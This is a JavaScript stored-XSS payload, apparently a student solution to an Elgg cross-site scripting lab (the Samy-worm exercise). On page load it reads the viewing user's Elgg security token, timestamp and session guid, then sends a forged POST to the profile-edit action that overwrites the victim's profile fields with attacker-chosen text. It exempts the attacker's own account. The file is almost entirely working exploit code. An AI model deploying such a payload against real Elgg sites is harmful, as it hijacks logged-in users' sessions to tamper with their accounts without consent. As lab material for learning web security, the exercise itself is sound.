<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.

        var samyID = 47;
        var ownerID = elgg.session.user.guid;   //current user ID from elgg session data from 'view page source'

        //var sendurl=null; //FILL IN
	    //var content=null; //FILL IN

        //http://www.xsslabelgg.com/action/profile/edit
		//A POST request with this link is generated when editing a prpfile
		
		
		var sendurl = "http://www.xsslabelgg.com/action/profile/edit";

		//adding key-value pairs to the content
		//&key=value
		//this content will be passed as the body of the post request.
		//content will carry all variables from Params of POST request

        var guid = "&guid=" + elgg.session.user.guid;
	    var name = "&name="+elgg.session.user.name;

        //content = token + ts + name;

	    var briefdescription = "&briefdescription=1605008" + "&accesslevel[briefdescription]=1";          //Each accesslevel[] = 1 , 1 indicates 'Logged In Users'
        var contactemail = "&contactemail=1605008@email.com" + "&accesslevel[contactemail]=1";
        var description = "&description=1605008" + "&accesslevel[description]=1";
        var interests = "&interests=NothingIsTrue" + "&accesslevel[interests]=1";
        var location = "&location=NothingIsTrue" + "&accesslevel[location]=1";
        var mobile = "&mobile=01919214111" + "&accesslevel[mobile]=1";
        var phone = "&phone=62679" + "&accesslevel[phone]=1";
        var skills = "&skills=NothingIsTrue" + "&accesslevel[skills]=1"; 
        var twitter = "&twitter=NothingIsTrue" + "&accesslevel[twitter]=1";
        var website = "&website=http://www.xsslabelgg.com/" + "&accesslevel[website]=1";
	   //var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
	   //var content = token + ts + name + description + guid;
        var content = token + ts + name + briefdescription + contactemail + description + interests + location + mobile + phone + skills + twitter + website + guid;         //content is created
	
	if(samyID != ownerID)           //Checking if the current user is not Samy . As , the request not applicable for Samy
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);            //conent is passed as the body of the post request
	}
	}
</script>
